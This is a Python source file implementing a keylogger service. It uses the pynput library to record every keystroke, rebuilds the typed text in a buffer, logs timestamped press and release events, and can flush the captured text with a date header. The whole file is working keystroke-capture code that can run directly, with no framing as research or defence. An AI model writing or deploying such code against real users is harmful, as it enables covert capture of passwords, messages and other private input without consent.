import threading, time
from datetime import datetime
from pynput import keyboard
from typing import List
from interface import IKeylogger

class KeyloggerService(IKeylogger):
    def __init__(self):
        self._buffer = ""
        self._raw_events = []
        self._listener = None
        self._is_logging = False
        self._lock = threading.Lock()

    def start_logging(self) -> None:
        if not self._is_logging:
            self._is_logging = True
            self._listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
            self._listener.start()
            self._listener.join()

    def stop_logging(self) -> None:
        if self._is_logging:
            self._is_logging = False
            if self._listener:
                self._listener.stop()

    def get_logged_keys(self) -> List[str]:
        with self._lock:
            return self._buffer.splitlines()

    def flush_buffer(self) -> str:
        with self._lock:
            if self._buffer:
                header = f"[{datetime.now().strftime('%Y-%m-%d %H:%M')}]\n"
                log_data = header + self._buffer
                self._buffer = ""
                return log_data
            return ""

    def _on_press(self, key):
        with self._lock:
            try:
                char = key.char
                self._buffer += char
                print(self._buffer)
            except AttributeError:
                if key == keyboard.Key.space:
                    self._buffer += " "
                elif key == keyboard.Key.enter:
                    self._buffer += "\n"
                elif key == keyboard.Key.tab:
                    self._buffer += "\t"
                elif key == keyboard.Key.backspace:
                    self._buffer = self._buffer[:-1]
                else:
                    self._buffer += f"[{key}]"
            self._raw_events.append((datetime.now(), "press", str(key)))

    def _on_release(self, key):
        with self._lock:
            self._raw_events.append((datetime.now(), "release", str(key)))

if __name__ == "__main__":
    keylogger = KeyloggerService()
    keylogger.start_logging()